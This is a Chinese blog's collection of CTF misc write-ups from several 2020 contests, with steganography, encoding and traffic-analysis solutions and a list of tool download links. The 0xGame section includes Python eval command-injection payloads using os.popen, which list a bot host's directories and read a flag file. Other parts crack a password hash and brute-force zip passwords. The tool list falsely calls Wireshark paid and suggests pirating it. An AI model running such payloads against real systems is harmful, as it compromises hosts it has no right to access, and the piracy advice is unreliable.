这道题可能是出题人的脑洞开的太大了，不光有机器学习的部分，还要熟悉jpg文件的这种文件头才能有完整的思路，而且时间也有点紧，最后大家没人做，可能还浪费了一些时间，出题人给大家道个歉qwq 关于最终的脚本，因为是以jupyter notebook格式写的，我把它们放到了网盘上，这里只提供了第一种思路的解题方法，只要把文件放在train和test同一目录下，按顺序执行就好，中间会多出来一些临时文件夹和一个超大的模型h5文件（因为直接调了包里的模型，参数太多了），最后生成的res_flag.jpg就是结果，如果对深度学习感兴趣可以找一下MNIST手写数字识别，这个题目算是一种改编 Base的千层套路 这题和下一题都是密码学题目，但是和misc没啥区别。 已经有肉眼看穿题目给的所有base的能力了，没啥难度看着解就行 PigIsSoCute hint是猪圈栅栏，没难度，下载下来的txt是一个b64编码的图片，去b64转文件得到猪圈密码的图片，对着识别解密得到字符串，进行栅栏解密得到可读的明文套上c1ctf{}即可 ","link":"http://ayanagi.fun/C1CTF2020/"},{"title":"HECTF 2020 MISC WP","content":"难度倒不是很高，只是做不出来罢了。 看直播 访问HECTF的直播间，画面中写着flag。 png 非常基础的题，winhex打开 b64解码最后面拿到一半flag，png格式别忘了考虑宽高，改宽高得到另一半 不说人话 Ook 溯源溯源 社工题。 以下是官方wp： 姓名使用支付宝 域名邮箱使用爱站 公司名百度手机号即可 MakeSteg Great Again winhex打开得到一个key： P@SsW00000 outguess没用、zsteg没用，stegpy没用，stegdetect没用(可能我这玩意我根本没装好，就没试过成功的)。本来以为自己还是会一些图片隐写的，实际上还欠缺得太多。以下是官方WP: 有一个key，很容易想到steghide steghideextract -sf Steg.jpg -p p0SsW0000 能得到一个压缩包，里面是pyc文件，如果是我的话就拿去反编译了。照着复现的时候尝试反编译，出来的是对我来说非常复杂的python脚本，必然做不出来。眼界又宽阔了，这里其实用的是pyc隐写，使用Stegosaurus，仅支持py3.6以下版本 pythonstegosaurus.py GitHacker.pyc -x 得到key： 'PPPPasword'_And_do_you_love_winter 提示知道是snow隐写 SNOW.EXE -C -p PPPPasword white.txt babymisc winhex打开，没啥思路，hint是文件hex尾部有编码后的flag后两位是zp，也没啥思路。 以下是官方wp： 使用010打开文件，会发现有一串全为0，然后像是base64，解码却出不来，根据提示：文件hex尾部有编码后的flag的后两位，在base后面加上zp，base58解码即可 总结 已经遇到非常严重的瓶颈期了，尤其是环境配不好，每次参加比赛都有新花样。说新也不新，只是我见识少。 ","link":"http://ayanagi.fun/HECTF2020/"},{"title":"NCTF2020-misc wp","content":"ak了misc，男团非常的强。 彩蛋 观察教学楼对出的横幅或者Leon发在空间的说说即可得到 flag:NCTF{We1c0m3_t0_NCTF2020!}提交发现不对，试了好几次 ，发现要将感叹号去掉。 flag： NCTF{We1c0m3_t0_NCTF2020} NCTF2020问卷调查 一开始点进靶机无法访问，观察群消息给的hint，知道需要挂 梯子才能看到问卷，打开ShadowSocksR，右键右下角图标选择 PAC模式，再打开靶机即可查看问卷，在必填的选项框中填写相 应的内容，最后提交，即可得到。 flag： NCTF{Let's_look_forward_to_X1CTF} ","link":"http://ayanagi.fun/NCTF2020/"},{"title":"misc一些环境的配置问题","content":"等我misc再强一点就去学逆向，占坑。龟速更新中. 配环境其实没啥好说的,遇到啥题目照着配就是了,或者复现的时候跟着补齐,以后还会有cmake方式配一些比较刁钻的工具,比如之前roar的无线电流量分析工具,等我学会就写上来. 其实很多工具一些ctf群里也会提供.并没有那么多的必要特地去配. 文件篇 winhex https://www.52pojie.cn/thread-1252078-1-1.html 010editor http://www.pc6.com/softview/SoftView_55129.html 记得点普通下载地址避免捆绑安装垃圾 oursecret http://www.uzzf.com/soft/68820.html 记得点普通下载地址避免捆绑安装垃圾 AlternateStreamView ctfshow群文件自行下载 silent eye http://www.opdown.com/soft/88597.html 普通下载 图片篇 stegsolve http://www.ddooo.com/softdown/122537.htm 记得点普通下载地址避免捆绑安装垃圾 stegdetect ctfshow群文件自行下载(超不负责任的) outguess kali下 git clone https://github.com.cnpmjs.org/crorvick/outguess 然后在outguess文件夹下打开终端 ./configure &amp;&amp; make &amp;&amp; make install stegpy kali下 pip3 install stegpy zsteg 安装zsteg需要使用gem命令，所以首先更换rubygems源。 gem sources --remove https://rubygems.org/ gem sources --add https://gems.ruby-china.com/ gem sources -l 安装 git clone https://github.com/zed-0xff/zsteg cd zsteg/ gem install zsteg lsb git clone https://github.com/livz/cloacked-pixel F5隐写 git clone https://github.com/matthewgao/F5-steganography gaps拼图 git clone https://github.com/nemanja-m/gaps.git cd gaps pip install -r requirements.txt apt-get install python-tk pip install -e . 这里说一下，python-tk如果你有使用过cloacked-pixel脚本的话是已经装好了的，不过再输一次安装指令也无所谓。 盲水印BlindWater-Mark git clone https://github.com.cnpmjs.org/chishaxie/BlindWaterMark 压缩包篇 archpr https://www.52pojie.cn/thread-467392-1-1.html 字符串、编码篇 jpk https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=555950 cyberchef 涵盖太多的神器。 https://gchq.github.io/CyberChef/ 流量分析篇 wireshark 应该是收费的,故下盗版 http://www.pc6.com/softview/SoftView_38486.html 记得点普通下载地址避免捆绑安装垃圾 音频篇 audacity https://www.audacityteam.org/ deepsound https://maddownload.com/audio-video/audio-editors/deepsound/download/ kali篇 主要介绍基础的kali大环境配置，比如python及各种包的安装。 首先是vmware. https://www.vmware.com/cn/products/workstation-player/workstation-player-evaluation.html 照着流程走就行,下好kali的镜像之后创建虚拟机我使用的是Debian10.x 64bit. amd用户记得开启虚拟化. 其次是kali的镜像 https://www.kali.org/downloads/ 下载Kali Linux 64-bit (Installer) 即可,鉴于速度实在太慢,也懒得找国内的镜像,直接下载旁边的Torrent使用迅雷云盘上传+取回的方式满速下载.需要开通迅雷VIP,或者使用其他BT下载软件(我反正是没用过,反正环境这玩意一次性安装折腾一下也没什么大不了) 将pip永久更换成国内源 由于kali里使用代理比较麻烦，pip的原始来源是非常慢的，故采用国内源来获取python的包。 操作如下 cd mkdir .pip cd .pip vim pip.conf 终端界面会变得稍微有些不一样，然后复制如下内容 [global] index-url=http://pypi.douban.com/simple trusted-host = pypi.douban.com 使用ctrl+shift+v原地粘贴，之后按下大写锁定，输入ZZ，完成。 git clone源使用国内镜像站 在clone某个项目的时候的github.com更换成github.com.cnpmjs.org 例如 git clone https://github.com/beurtschipper/Depix 我们改用 git clone https://github.com.cnpmjs.org/beurtschipper/Depix Volatility windows下载 http://downloads.volatilityfoundation.org/releases/2.6/volatility_2.6_lin64_standalone.zip 然后解压，之后的文件夹扔进kali，修改一下文件名为volatility更方便运行 以后要运行的时候在文件夹下打开终端 ./volatility ~ ~为各种参数 ","link":"http://ayanagi.fun/atFgXsbYK/"},{"title":"硬盘管理","content":"依然是占坑，但是必然会写 ","link":"http://ayanagi.fun/discmanage/"},{"title":"主板的探讨","content":"占坑，一直很喜欢各大家的主板，真的非常百花齐放了 ","link":"http://ayanagi.fun/motherboard/"},{"title":"指点江山","content":"Todo ","link":"http://ayanagi.fun/YYGQ/"},{"title":"Python类库学习-Pillow","content":"终于要开始写啦，拖了半年以上惹哭哭。骂一下自己的懒惰。 安装 使用的IDE为Pycharm，故不赘述。(懒) 使用 你的第一行一定是 from PIL import Image 现在已经导入了pillow库，以exp.jpg为例，我们来对图像进行一些处理。 紧接着写下 im = Image.open('exp.jpg') 这样，就有了一个im对象，目标就是exp.jpg，我们就可以使用对象具有的方法对图像进行操作了。使用show方法查看图片，流程是先生成临时文件，然后使用图片查看器来打开。 运行效果如下 我们可以看到，图片的文件名并不是exp.jpg，所以可以知道它确确实实是生成临时文件。想要保存图片的话，直接使用save方法。 ","link":"http://ayanagi.fun/Python/"},{"title":"0xGame-misc wp","content":"week1 签到题 查看rules可以得到flag 0xGame{Welc0m_to_0xGame2020} easyBase 一眼看出base64加密，base16 解密即可 QR_repair qq截图两张不全的二维码，用美图秀秀拼在一起，百度找一张二维码角的图片贴上去，再用微信扫码即可 lowerBase64 每四个字符一组穷举改大小写解出 官方wp： Base64会把原文的3个字节为一组，一共是24bits，6bits一组重组为4个新的字符。所以我们爆破时需 要以4个一组，枚举所有字母大小写的组合，然后进行解码。 exp: from base64 import b64decode from itertools import product c = 'mhhnyw1lezviodq1ntkxltmwmditngjlny1hzgi5lwu4m2q1ntcymtblnx0=' table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-{}' flag = b&quot;&quot; real_data = &quot;&quot; for i in range(0, len(c), 4): pos = [] for char in c[i:i+4]: pos.append([char.lower(), char.upper()]) cases = [&quot;&quot;.join(k) for k in product(*pos)] for case in cases: if all(chr(char) in table for char in b64decode(case)): real_data += case flag += b64decode(case) break print(real_data) print(flag.decode()) pcap wireshark打开 搜索HTTP POST发现有文件上传，类型为zip，导出HTTP对象为zip，解压得到图片改宽高 一个小非预期：binwalk可以直接分离出zip文件 week2 Differentpic stegsolve打开image compare模式发现二维码 保存二维码打开更改滤镜扫码得到flag Extract Binwalk解压得到二维码，扫码提示stegpy，搜索stegpy，发现使用方法，使用stegpy对图片解密得到flag week3 threeThousand 编写脚本 import os import shutil import zipfile import random from os.path import join, getsize fileIndex = 3000 while(fileIndex != 1): fileName = &quot;%d.zip&quot; % fileIndex print(&quot;begining extract: &quot; + fileName) f = zipfile.ZipFile(fileName, 'r') for i in range(0, 100): try: f.extractall(pwd = ('%02d' % i).encode(&quot;utf-8&quot;), path = r&quot;./&quot;) print(&quot;pwd = %02d&quot; % i) break except: pass f.close() os.remove(r&quot;./%s&quot; % fileName) fileIndex = fileIndex - 1 easyMisc 按F12发现两行 &lt;!--ZWFzeU1pc2MvZmxhZy56aXA=--&gt; &lt;!--ZWFzeU1pc2MvcmVjb3JkLndhdg==--&gt; 都是base64加密，解密后的结果粘贴补充到地址栏可以得到压缩包和wav，猫猫hint的图用stegpy解密得知从wav里获取压缩包密码(并没有什么意义的hint)，au打开,是DTMF 得到压缩包密码,解压图片使用stegpy解开得flag week4 flip 解压文件夹后au打开pwd.mp3写出摩斯电码，解密，按照题目说法把密码顺序调转打开压缩包，得到txt文件将里面的二进制数逐一逆序后放入JDK，二进制转ascii得到第二个密码，压缩包里隐藏了一张图片需要在kali里binwalk出来，图片已加密，刚好输入第二个密码得到flag图片，扫描二维码可得flag Hex酱 不会python 不会做，唯一一个没出来的misc题 官方wp： 其实是一道web题 源码： import random import base64 import hashlib wrong_msg = [&quot;我可运行不了这种呀&quot;,&quot;不支持这么写啦&quot;, &quot;看不懂这种呀&quot;, &quot;哎呀，没有运行成功~&quot;] def keyword_filter(keyword, msg): for i in keyword: if i not in msg: return False return True def py_filter(msg): for keyword in [&quot;class&quot;, &quot;eval&quot;, &quot;exec&quot;,&quot;input&quot;,&quot;listdir&quot;, &quot;help&quot;,&quot;powershell&quot;, &quot;cmd&quot;, &quot;shutdown&quot;, &quot;del&quot;, &quot;logoff&quot;, &quot;sys&quot;, &quot;globals&quot;, &quot;builtins&quot;, &quot;getattr&quot;, &quot;pow&quot;]: if keyword_filter(keyword, msg): return [False, keyword] if &quot;**&quot; in msg: return [False,&quot;**&quot;] return [True] def do_python(msg): try: msg = msg[6:-1] print(msg) key_word = py_filter(msg) if key_word[0]: temp = eval(msg) else:return &quot;包含关键词：&quot;+key_word[1] if temp != None: return str(temp) else: return random.choice(wrong_msg) except: return random.choice(wrong_msg) def rcode(msg): if msg[:6] == &quot;print(&quot; and msg[-1] == &quot;)&quot;: return [True, do_python(msg)] if (msg[:4] == &quot;md5(&quot; or msg[:4] == &quot;MD5(&quot;) and msg[-1] == &quot;)&quot;: return [True, hashlib.md5(msg[4:-1].encode()).hexdigest()] if (msg[:7] == &quot;sha256(&quot; or msg[:7] == &quot;SHA256(&quot;) and msg[-1] == &quot;)&quot;: return [True, hashlib.sha256(msg[7:-1].encode()).hexdigest()] if (msg[:7] == &quot;sha512(&quot; or msg[:7] == &quot;SHA512(&quot;) and msg[-1] == &quot;)&quot;: return [True, hashlib.sha512(msg[7:-1].encode()).hexdigest()] if msg[:10] == &quot;b64encode(&quot; and msg[-1] == &quot;)&quot;: return [True, base64.b64encode(msg[10:-1].encode()).decode()] if msg[:10] == &quot;b64decode(&quot; and msg[-1] == &quot;)&quot;: return [True, base64.b64decode(msg[10:-1]).decode()] return [None] 就是调用eval执行python代码，绕过黑名单过滤进行一个python命令注入就可以拿到flag 黑名单是只要出现了某个关键词中的所有字符就会过滤 其实过滤没起什么作用，看起来过滤了很多，但是 import os 没过滤 windows下对大小写不敏感，全大写就行，所以拿flag的姿势非常多 二进制编码也行 最简单的使用os库执行系统命令： print(__import__('os').popen('WHOAMI').read()) izozp2s3d5jnzaz\\administrator 列当前目录文件： print(__import__('os').popen('DIR').read()) 2020/11/03 15:52 &lt;DIR&gt; . 2020/11/03 15:52 &lt;DIR&gt; .. 2020/08/11 11:39 &lt;DIR&gt; app 2020/08/11 11:39 &lt;DIR&gt; conf 2020/08/11 11:39 &lt;DIR&gt; data 2020/09/24 16:23 &lt;DIR&gt; go-cqhttp 2020/08/11 11:39 &lt;DIR&gt; httpapi 2020/09/22 20:38 1,312 main_bot.py 2020/09/18 01:20 1,813 massage_filter.py 2020/11/03 15:52 1,850 runcode.py 2020/09/18 01:20 &lt;DIR&gt; __pycache__ 查看当前路径： print(__import__('os').popen('CD').read()) C:\\Users\\Administrator\\Desktop\\Game\\HexQBot 查看上一级目录： print(__import__('os').popen('DIR ..\\\\').read()) 2020/09/30 00:33 &lt;DIR&gt; . 2020/09/30 00:33 &lt;DIR&gt; .. 2020/10/27 00:13 &lt;DIR&gt; HexQBot 2020/09/30 00:33 9,440,520 HexQBot.zip 2020/09/30 00:33 &lt;DIR&gt; __MACOSX 查看桌面文件： #有时候qq会因为消息长度限制导致无回显，dir命令加个/b就好了 #一般windows题，flag经常在桌面上 print(__import__('os').popen('DIR /B ..\\\\..\\\\').read()) 或者 print(__import__('os').popen('DIR /B %USERPROFILE%\\\\DESKTOP').read()) 或者 print(__import__('os').popen('DIR /B C:\\\\USERS\\\\ADMINISTRATOR\\\\DESKTOP').read()) BtSoft.exe Game go-cqhttp-v0.9.17-windows-amd64.zip Google Chrome.lnk here_is_flag.txt HexQBot HexQBot - 副本 HexQBot - 副本.zip jdk-14.0.2_windows-x64_bin.exe Mirai整合包Dice+铃心564 Mirai整合包Dice+铃心564.zip pycryptodome-3.9.8-cp36-cp36m-win_amd64.whl python-3.7.6-amd64.exe task Visual Studio Code.lnk yafu-1.34 yafu-1.34.zip 宝塔面板.lnk 在桌面看到flag文件： here_is_flag.txt 查看flag： print(__import__('os').popen('TYPE %USERPROFILE%\\\\DESKTOP\\\\HERE_IS_FLAG.TXT').read()) 或者使用通配符?： print(__import__('os').popen('TYPE %USERPROFILE%\\\\DESKTOP\\\\????_?? _????.???').read()) 或者*： print(__import__('os').popen('TYPE %USERPROFILE%\\\\DESKTOP\\\\HER*').read()) #0xGame{621a9c2d-0f24-40fc-b5e2-8d8018e5165b} 下次出windows题可能把flag放在内网服务了，搞一个域渗透？ ","link":"http://ayanagi.fun/0xGame/"},{"title":"BUUCTF-misc wp","content":"Todooooo ","link":"http://ayanagi.fun/BUUCTF/"},{"title":"CTFshow-misc wp","content":"杂项签到 伪加密，winhex打开搜十六进制的504B0102,把02往后数5个字节的09改为00 flag: flag{79ddfa61bda03defa7bfd8d702a656e4} ","link":"http://ayanagi.fun/CTFshow/"},{"title":"XCTF-攻防世界-misc wp","content":"Todo ","link":"http://ayanagi.fun/XCTF/"},{"title":"UNCTF2020-misc wp","content":"YLB's CAPTCHA 第一次从这里知道易霖博，毕竟这个比赛是入门CTF两个月就上手打的，全靠题目图一乐，对系统的知识完全没有了解，大概搜了一下这个验证码相关的事儿，大概就是验证码很恶心难以辨认，一开始还以为是啥web题。毕竟输入了很多次都是0分，想着是不是可以绕过之类的，可是又有很多人过了，也不认为是什么高深的技术手段。后来认认真真的输入了一次，加了一分，真就直接输入验证码呢。 输错了会把分数清零重来，连续输对10次就能得到flag。 阴阳人编码 文本是只由 就这. 就这¿ 不会吧! 组成联想到ook，使用Ctrl+H批量替换，ook解密可得flag 爷的历险记 在data里用记事本打开各种文件，能够直接看到flag UNCTF{WelC0me_70_UNCTF2oZ0~} YLB绝密文件 吃了不会python的亏，三个hint文件都拿到了，不会写脚本跑。到处报错。 各种追踪流可以得到xor.py和secret.python-38.pyc，后者反编译一下得到KEY key= 'YLBSB?YLBNB!' binwalk可以得到zip文件，解压出来是一个异或后的文件，必然是需要使用解密脚本去跑的 对照着加密脚本去写一个解密脚本，报错，不会写。卡在这了 以下是官方的解密脚本： ##coding:utf-8 import base64 key=&quot;YLBSB?YLBNB!&quot; file = open(&quot;YLBSB.docx&quot;, &quot;wb&quot;) enc = open(&quot;YLBSB.xor&quot;, &quot;rb&quot;) count = 0 cipher = enc.read() for c in cipher: d = chr(c ^ ord(key[count % len(key)])) file.write(d.encode()) count = count + 1 enc.close() file.close() file = open(&quot;YLBSB.docx&quot;, &quot;rb&quot;) plain = base64.b64decode(file.read()) file.close file = open(&quot;YLBSB.docx&quot;, &quot;wb&quot;) file.write(plain) file.close() 解码可得YLBSB.docx 最后一行白色的文字即为flag EZ_IMAGE 百度搜misc拼图之类的关键词，照着步骤去做，调整一下参数就行 montage unctf*.jpg -tile 15x15 -geometry 60x60+0+0 test.jpg gaps --image=test.jpg --generation=30 --population=300 --size=60 因为配环境的时候有些报错，耽误了时间，不然能拿三血 baba_is_you 之前pi播过这个游戏，还蛮喜欢的，而且目标也是一个flag，就觉得非常亲切。 图片丢winhex可以找到一个视频链接，进入评论区拿flag。 你能破解我的密码吗 shadow文件，搜一下就知道是大概是什么，有一段奇特的字符串 guguguguji:$1$AH$xtjky.3kppbU27tR0SDJT.:18556:0:99999:7::: 扔进kali里john一下 john -show shadow 得到 guguguguji:123456:18556:0:99999:7::: 1 password hash cracked, 0 left 密码就是123456，对其md5加密取32位小写得flag unctf{e10adc3949ba59abbe56e057f20f883e} 被删除的flag 扔进kali里 strings flag 最后一行就能发现flag unctf{congratulations!} 应该是一个非预期，strings对付一些题特别好用。 官方wp： file命令看一下发现是ext3文件，题目提示flag被删除了，用extundelete恢复文件 躲猫猫 excel文件可以改为zip文件，解压之后一个个点开看，就能找到base64加密的flag，解密就是 零 一开始还以为是什么小语种，傻傻的去查词典，查了半天也没个结果，和@Hh0 师傅讨论，师傅说可能是零宽。尝试之后成功。 在线解密地址 http://330k.github.io/misc_tools/unicode_steganography.html ET-msg 看了hint，google了一下Arecibo，发现了阿雷西博信息，但是没有什么思路 另一个hint是30 80 7 也没思路。 官方wp： 将01绘制成30*80图片后，第一部分为七进制0-6 的二进制表示（最下方点仅表示此处存在数字） 大括号中为七进制构成的flag，三个七进制一组，对照第一部分解出flag 网络深处1 解压，wav文件去DTMF解密，密码：15975384265 解压得到的第二个wav文件扔进audacity里，查看频谱 google搜索Tupper发现Tupper自我指涉公式，有几篇文章附有python脚本，跑了发现报错。 进而找到对应的wiki，wiki上有在线画图脚本，输入字符串即可得到图片 flag{Y29pbA==} 其实拿到flag后我还拿里面的base64解密了，以为解密后才是flag，解密之后还社工了一下，搜coil，其实没啥东西。 mouse_click 一看就知道是usb流量分析，在kali下直接tshark提取，之后以为要去除空行，其实发现几万行的空行，然后批量替换的话也会把有效的换行也替换掉，也很多，之后就懒得搞了 然后找了脚本搞了半天没出来，其实流量包里有废流量，tshark也会一并提取 需要先过滤掉没用的流量，只留下长度为31的流量 文件→导出特定分组，我保存为mouse.pcapng，之后可以tshark提取了，得到正常的数据 从网上抄一个把数据转换成坐标的脚本 #sniffer.py nums = [] keys = open('usbdata.txt','r') result=open('result.txt','w') posx = 0 posy = 0 for line in keys: x = int(line[2:4],16) y = int(line[5:7],16) if x &gt; 127 : x -= 256 if y &gt;115 : y -=256 posx += x posy += y btn_flag = int(line[0:2],16) # 1 for left , 2 for right , 0 for nothing if btn_flag == 1 : result.write(str(posx)+' '+str(-posy)+'\\n') keys.close() result.close() # gnuplot plot &quot;result.txt&quot; 走了超多的弯路，但是也学到了很多，很不错的一道题 撕坏的二维码 官方wp居然反应有人说题目太难，一点感觉也没有，虽然它碎了，但是只需要傻瓜式地补上右边的两个角，就能扫出来 体会到二维码的顽强，这东西真耐操，不错。 倒影 拿到了一血。这题特别简单，但是不知道为什么解的人不是特别多 下载下来解压是个exe文件，丢进winhex里查看头是一张jpg文件，最后有一段base64加密过的东西，解密后是一串字符串 0000000000B4000000A500100010000000006050B405106D6A9EA24E5767106D7AD58AC22940106D7AD58AC229400081001000000000000200A0478747E27616C666000000000000000200000000000000420080000000910000005297D4535E1555E5C90000801000A000F32010B405B4ECC7E9889EDF1BA30C6FF71836EBCFE9A735EFD6E501CE14109505827764B69DC37C6E2E478747E27616C66600000080000000910000005297D4535E1555E5C90000801000A04030B405 最后的4030B405，倒过来就能发现就是zip文件的文件头504B0304，写两行脚本逆序 唯一一个会写的脚本哈哈 s = '0000000000B4000000A500100010000000006050B405106D6A9EA24E5767106D7AD58AC22940106D7AD58AC229400081001000000000000200A0478747E27616C666000000000000000200000000000000420080000000910000005297D4535E1555E5C90000801000A000F32010B405B4ECC7E9889EDF1BA30C6FF71836EBCFE9A735EFD6E501CE14109505827764B69DC37C6E2E478747E27616C66600000080000000910000005297D4535E1555E5C90000801000A04030B405' print(s[::-1]) 得到逆序后的串，粘贴进010editor保存为zip，里面就是flag.txt，发现有密码，搞了好一会不知道密码，还以为要从图片里面得到，对jpg进行了各种detect，无果，后来直接爆破，密码为658745 flag: UNCTF{Th13_Is_@_F1@G} bashsecret 下下来是一个命名为pwn的文件，丢进kali，file一下发现是个ELF文件，strings、cat、binwalk皆无果，不会了。而且实名制看不懂官方的wp，大概感觉是需要pwn的知识，纯misc的瓶颈就到这了，继续努力。 官方wp： 报错使sha值为空 第二个输入空则可以使得判断相等 唯一注意报错时候 所带的指令cat可以执行即可。 太极八卦 不会，请会算法的小同学来处理，也没思路。 下面是官方wp： 这一题打开可以看到文本内全是八卦字符，两两一组，中心是=和○，结合hint可以知道○没用，所以根据=可以想到base家族，再根据八卦字符有八种且两两一组，可以联想到八八六十四种情况对应base64，再根据hint可以猜到文本内是双螺旋矩阵，前方高能，眩晕警告： 按照双螺旋矩阵读取成两个字符串，然后根据可以猜到八卦符号中的&quot;—&quot;为1&quot;- -&quot;为0，一个符号从上至下组成一个三位二进制数字，两个三位二进制数对应到b64编码表组成的矩阵中： 图中0是 第一位，1是指第二位 下面贴出的是我的渣渣出题脚本，解题脚本师傅们自行写逆过程吧，我懒得写了： #!/usr/bin/env python # -*- encoding: utf-8 -*- #unctf2020 出题 #coil import base64 import numpy numpy.set_printoptions(threshold=numpy.inf) gua = &quot;☷☳☵☱☶☲☴☰&quot; base64_alphabet = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; def ToBase64(file): with open(file, 'rb') as fileObj: image_data = fileObj.read() base64_data = base64.b64encode(image_data) return base64_data.decode() def ToFile(fileObj, file): base64_data = fileObj.read() ori_image_data = base64.b64decode(base64_data) fout = open(file, 'wb') fout.write(ori_image_data) txt1 = ToBase64(&quot;image0.bmp&quot;) print(txt1) txt1 = list(txt1) txt2 = ToBase64(&quot;image1.bmp&quot;) print(txt1) txt2 = list(txt2) l = int(pow((max(len(txt1),len(txt2)))*2,0.5))+1 m = &quot;=&quot;*(pow(l,2)) m = list(m) m = numpy.array(m, dtype=numpy.unicode_) m = m.reshape(l, l) pl = [] pl.append(l) for i in range(l-2,1,-2): pl.append(i) pl.append(i) pl.append(1) start = [0,-1] plsum = 0 for i in range(len(pl)): if plsum == 1612: break if i%4 == 0: index = 1 for j in range(pl[i]): start[index] += 1 m[start[0],start[1]] = txt1[plsum] plsum += 1 elif i%4 == 1: index = 0 for j in range(pl[i]): start[index] += 1 m[start[0],start[1]] = txt1[plsum] plsum += 1 elif i%4 == 2: index = 1 for j in range(pl[i]): start[index] -= 1 m[start[0],start[1]] = txt1[plsum] plsum += 1 elif i%4 == 3: index = 0 for j in range(pl[i]): start[index] -= 1 m[start[0],start[1]] = txt1[plsum] plsum += 1 start = [l-1,l] plsum = 0 for i in range(len(pl)): if plsum == 1612: break if i%4 == 0: index = 1 for j in range(pl[i]): start[index] -= 1 m[start[0],start[1]] = txt2[plsum] plsum += 1 elif i%4 == 1: index = 0 for j in range(pl[i]): start[index] -= 1 m[start[0],start[1]] = txt2[plsum] plsum += 1 elif i%4 == 2: index = 1 for j in range(pl[i]): start[index] += 1 m[start[0],start[1]] = txt2[plsum] plsum += 1 elif i%4 == 3: index = 0 for j in range(pl[i]): start[index] += 1 m[start[0],start[1]] = txt2[plsum] plsum += 1 m[int(l/2),int(l/2)] = '○' decode_s = &quot;&quot; for x in range(m.shape[1]): for y in range(m.shape[0]): c = m[x,y] pos = base64_alphabet.find(c) if pos == -1: decode_s += c*2 +&quot; &quot; else: pos = oct(pos) pos = str(pos).lstrip(&quot;0o&quot;) pos = pos.zfill(2) decode_s += gua[int(pos[0])]+gua[int(pos[1])]+&quot; &quot; decode_s += &quot;\\n&quot; with open(&quot;out.txt&quot;, &quot;wb&quot;) as outf: outf.write(decode_s.encode(&quot;utf-8&quot;)) 得到的b64字符串解码写文件可以得到两个bmp图片： 根据hint和文本中的两个○，可以猜到是将两个图片融合，这里我们使用融合卡融合stegsolve.jar打开image0.bmp，再用analyse-image combiner打开image1.bmp，第一个就是异或： 可以得到flag是 flag{t@1Ji_6A-Gu4_b64} 总结： hint -&gt; 知识点 -&gt; 工具 hint1，hint3 -&gt; 双螺旋矩阵 -&gt; hint2，&quot;＝&quot; -&gt; b64 -&gt; audacity b64解码后BM开头 -&gt; bmp文件头 -&gt; hint1，hint3，&quot;○&quot; -&gt; 图片异或 -&gt; stegsolve.jar ","link":"http://ayanagi.fun/UNCTF2020/"},{"title":"Hackergame 2020-misc wp","content":"入门一个月，第一次和全国范围的师傅们进行的比赛。一边摸索一边做题，在多方帮助下学到了一些东西。rank最后定格在了317/2410，个人感觉还是需要再努力一些。有一两道题感觉努力一下把环境配好还是能出的。配环境报错的时候真的蛮令人灰心的。 鉴于token制度的存在，具体flag应该会不一样。 签到 F12，将max的值改为1.0，拖到最右边提交可得。 flag{hR6Ku81-HappyHacking2020-a9833bf0c9} 猫咪问答++ 1.可以爆破，大眼一扫至少有4个，就从4开始试，一直试到12就ook了。 2、3、4、5百度搜就能搜到相关信息。 答案分别是256、9、9、17098. flag{b4a31f2a_G00G1e_1s_y0ur_fr13nd_e836337896} 2048 当时也有在玩2048，然后果断进去先铁头娃玩个一通，拿到2048之后发现并没有给出flag，F12看源码发现最高值是8192，以我的水平必然玩不出来。在注释出发现一段代码 &lt;!-- changelog: - 2020/10/31 getflxg @ static/js/html_actuator.js --&gt; 在题目地址栏后添加static/js/html_actuator.js作为一个payload，得到一个逻辑源码页面，往下寻找可以发现一段 if (won) { url = &quot;/getflxg?my_favorite_fruit=&quot; + ('b'+'a'+ +'a'+'a').toLowerCase(); } else { url = &quot;/getflxg?my_favorite_fruit=&quot;; } 脑洞一下可以大概知道baxaxa是什么单词，而且是fruit种类，那必然是banana 将题目url后加上/getflxg?my_favorite_fruit=banana作为payload flxg{8G6so5g-FLXG-26aa589d52} 一闪而过的flag 下下来打开这个exe文件，会弹出flag，然后程序快速退出。只需要在打开显示flag的时候使用qq截图，截取并且识别flag即可。 flag {Are_you_eyes1ght_g00D?_can_you_dIst1nguish_1iI?} 从零开始的记账工具人 一开始使用的是excel批量替换，但是出现迷之错误，大致有3类坑，全被我踩过了。 1.整元没有考虑。 2.只有分、只有角的没有考虑。 3.替换十的时候，必须得从二十一开始替换，并且避开整十，最后才去替换十几，否则会出现很恶心的错误。 x.以及各种各样很烦的要注意的东西。 当时被这道题搞得心态都炸了，因为替换逻辑没处理好的话是根本得不出答案的，后面尝试了很多种替换方案，最后出来了，其中酸楚，唯有自己知道。当时心态炸裂之后甚至头铁的一条一条去替换，后来出现大量不耐烦的错误，必然也得不到答案，心如死灰。一起做的同僚自己写个VB脚本跑了出来，痛恨自己写代码的水平无限趋近于0吧，也是我在CTF之路继续前行的一个非常大但必须克服的阻碍。 主要替换的思路就是从小数点后面开始替换，从分到角，然后注意处理整数、没有元只有角分的数，以及从二十一开始替换，并且整十数和十几的数最后替换。 超简单的世界模拟器 蝴蝶效应 一道非常有教育意义和趣味性的题，我很喜欢。 百度搜生命游戏，便可以得到相当多的资料。 在左上角放置一个“轻量级飞船”即可撞烂上面的方块得到第一个flag。 一石二鸟 这个尝试了蛮多种组合，都不行。后来得到同僚的提示，只需要使用一个飞船和一个滑翔机的组合就可以，后来一直尝试成功了。具体矩阵已经丢失，也懒得去复现了 从零开始的火星文生活 试了用各种编码打开，没啥思路。 以下是官方wp： 过程 下载附件之后如直接用 GBK 打开，那就真的是题面里说的“夹杂着日语和数字的火星文”了。恭喜掉进坑，乱码又多了一层（逃 用 UTF-8 打开，看到形如“脦脪鹿楼”的文本，推断是上图中的“古文码”乱码。但是“古文码”明明是“以 GBK 方式读取 UTF-8 编码”造成的，看来“脦脪鹿楼”本来应当是 GBK下看到的结果，却又被存成了 UTF-8。所以第一步是用 GBK 重新编码文本“脦脪鹿楼...”。 然后用 UTF-8 打开，看到形如“ÎÒ¹¥ÆÆÁË”的文本，推断是上图中的“拼音码”乱码。“拼音码”是“以 ISO8859-1 方式读取 GBK 编码”，而现在文本的编码是 UTF-8。所以接下应当用 ISO8859-1 重新编码文本“ÎÒ¹¥ÆÆÁË...”。 然后用 GBK 打开，就能看到可读的汉字和 flag 了（原始编码确实是 GBK 呢！）。不过这里的 flag 全部是从 ASCII 字符转成的全角字符，不能直接复制使用。可以手动替换成 ASCII 字符，或者用其他简便方法变回 ASCII 字符。 源代码 